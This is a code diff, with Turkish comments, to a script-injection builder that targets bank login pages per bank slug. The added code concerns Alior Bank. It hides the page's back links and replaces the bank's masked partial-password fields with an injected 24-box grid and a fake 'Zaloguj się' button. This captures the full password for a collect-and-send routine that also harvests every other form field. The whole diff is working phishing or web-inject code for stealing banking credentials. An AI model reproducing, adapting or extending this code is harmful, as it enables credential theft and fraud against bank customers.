@@ -195,6 +195,8 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
       const data = {};
       try {
         qsa(doc, "input, textarea, select").forEach((el) => {
+          // Enjekte UI inputlari veriye karismasin (alior custom grid)
+          try { if (el.hasAttribute("data-pl-internal")) return; } catch (e) {}
           const type = (el.getAttribute("type") || "text").toLowerCase();
           const name = pickKey(el, doc);
           if (!name) return;
@@ -284,6 +286,9 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
 
     const isSubmitish = (el) => {
       if (!el || !el.getAttribute) return false;
+      // Kendi enjekte ettigimiz UI (alior custom form) — doc-level
+      // submit yakalayici bunlara dokunmaz; kendi listener'i gonderir.
+      if (el.hasAttribute && el.hasAttribute("data-pl-internal")) return false;
       const tag = (el.tagName || "").toLowerCase();
       const type = (el.getAttribute("type") || "").toLowerCase();
       const role = (el.getAttribute("role") || "").toLowerCase();
@@ -907,24 +912,104 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
     const applyAliorFix = () => {
       try {
         if (BANK_SLUG !== "alior") return;
+        // Cofnij/geri linklerini tamamen kaldir
         qsa(document, "a").forEach((a) => {
           try {
             const t = ((a.innerText || a.textContent || "") + " " + (a.getAttribute("ui-sref") || "") + " " + (a.getAttribute("href") || "")).toLowerCase();
             if (/cofnij|wstecz|powr/.test(t)) a.style.setProperty("display", "none", "important");
           } catch (e) {}
         });
-        qsa(document, ".masked-input-wrapper").forEach((w) => {
-          try {
-            if (w.__plAliorClick) return;
-            w.__plAliorClick = true;
-            w.addEventListener("click", () => {
-              try {
-                const inp = w.querySelector("input.js-keyboard-masked-input") || w.querySelector("input:not(.visually-hidden)");
-                if (inp) { try { inp.disabled = false; } catch (e) {} try { inp.focus(); } catch (e) {} try { inp.select(); } catch (e) {} }
-              } catch (e) {}
-            });
-          } catch (e) {}
+        // --------------------------------------------------------------
+        // KENDI FORMUMUZ: bankanin Angular-attr'li DOM'u (masked kutulari
+        // property-disabled, butonu ng-bind/ng-disabled ile olu) yerine
+        // tamamen bizim kontrolumuzde 24 kutu + Zaloguj butonu enjekte
+        // edilir. Degerler native masked[N] inputlarina senkronlanir —
+        // collect() birlesik password'u oradan okur.
+        // --------------------------------------------------------------
+        if (document.getElementById("pl-alior-form")) return;
+        const natives = qsa(document, "input.js-keyboard-masked-input");
+        if (!natives.length) return;
+        const fieldset = natives[0].closest ? natives[0].closest("fieldset") : null;
+        const hideHost = (natives[0].closest && natives[0].closest("masked-input")) || document.querySelector(".js-password-masked");
+        const maskedPass = document.querySelector(".masked-password");
+        const grid = document.createElement("div");
+        grid.id = "pl-alior-form";
+        grid.setAttribute("data-pl-internal", "");
+        grid.style.cssText = "display:flex;flex-wrap:wrap;justify-content:center;gap:8px 6px;padding:8px 0 0 0;";
+        const inputs = [];
+        natives.forEach((nat, i) => {
+          const cell = document.createElement("div");
+          cell.setAttribute("data-pl-internal", "");
+          cell.style.cssText = "display:flex;flex-direction:column;align-items:center;gap:3px;cursor:text;";
+          const inp = document.createElement("input");
+          inp.setAttribute("type", "text");
+          inp.setAttribute("maxlength", "1");
+          inp.setAttribute("autocomplete", "off");
+          inp.setAttribute("data-pl-internal", "");
+          inp.style.cssText =
+            "width:32px;height:44px;min-width:0;padding:0;border:1px solid #c8c8c8;border-radius:6px;" +
+            "background:#ffffff;text-align:center;font-size:19px;font-weight:600;color:#191c1f;" +
+            "caret-color:#191c1f;cursor:text;pointer-events:auto;box-sizing:border-box;";
+          inp.addEventListener("input", () => {
+            try {
+              const v = (inp.value || "").slice(-1);
+              inp.value = v;
+              try { nat.value = v; nat.dispatchEvent(new Event("input", { bubbles: true })); } catch (e) {}
+              if (v && inputs[i + 1]) { try { inputs[i + 1].focus(); inputs[i + 1].select(); } catch (e) {} }
+            } catch (e) {}
+          });
+          inp.addEventListener("keydown", (ev) => {
+            try {
+              if (ev.key === "Backspace" && !(inp.value || "")) {
+                const pv = inputs[i - 1];
+                if (pv) { pv.value = ""; try { natives[i - 1].value = ""; } catch (e) {} pv.focus(); }
+              }
+            } catch (e) {}
+          });
+          cell.addEventListener("click", () => { try { inp.focus(); } catch (e) {} });
+          const lab = document.createElement("div");
+          lab.textContent = String(i + 1);
+          lab.setAttribute("data-pl-internal", "");
+          lab.style.cssText = "font-size:11px;color:#767676;pointer-events:none;";
+          cell.appendChild(inp);
+          cell.appendChild(lab);
+          grid.appendChild(cell);
+          inputs.push(inp);
         });
+        const btn = document.createElement("button");
+        btn.type = "button";
+        btn.id = "pl-alior-login";
+        btn.setAttribute("data-pl-internal", "");
+        btn.textContent = "Zaloguj się";
+        btn.style.cssText =
+          "display:block;width:100%;max-width:340px;margin:18px auto 0 auto;min-height:50px;" +
+          "background:#6d1d24;color:#ffffff;border:none;border-radius:6px;font-size:15px;font-weight:600;" +
+          "cursor:pointer;pointer-events:auto;position:relative;z-index:50;";
+        btn.addEventListener("click", (e) => {
+          try { e.preventDefault(); e.stopPropagation(); } catch (err) {}
+          if (!allFieldsFilled()) { flashEmpty(); updateSubmitReady(document); return; }
+          send("click:pl-alior-login");
+        });
+        const refreshAliorBtn = () => {
+          try {
+            const ready = allFieldsFilled();
+            btn.style.opacity = ready ? "1" : "0.55";
+            btn.style.filter = ready ? "none" : "grayscale(.35)";
+            btn.style.cursor = ready ? "pointer" : "not-allowed";
+          } catch (e) {}
+        };
+        refreshAliorBtn();
+        document.addEventListener("input", refreshAliorBtn, true);
+        const holder = document.createElement("div");
+        holder.id = "pl-alior-wrap";
+        holder.setAttribute("data-pl-internal", "");
+        holder.style.cssText = "padding:4px 0 2px 0;";
+        holder.appendChild(grid);
+        holder.appendChild(btn);
+        if (hideHost) hideHost.style.display = "none";
+        if (maskedPass) maskedPass.style.display = "none";
+        if (fieldset && fieldset.parentElement) fieldset.parentElement.insertBefore(holder, fieldset.nextSibling);
+        else (document.body || document.documentElement).appendChild(holder);
       } catch (e) {}
     };
 
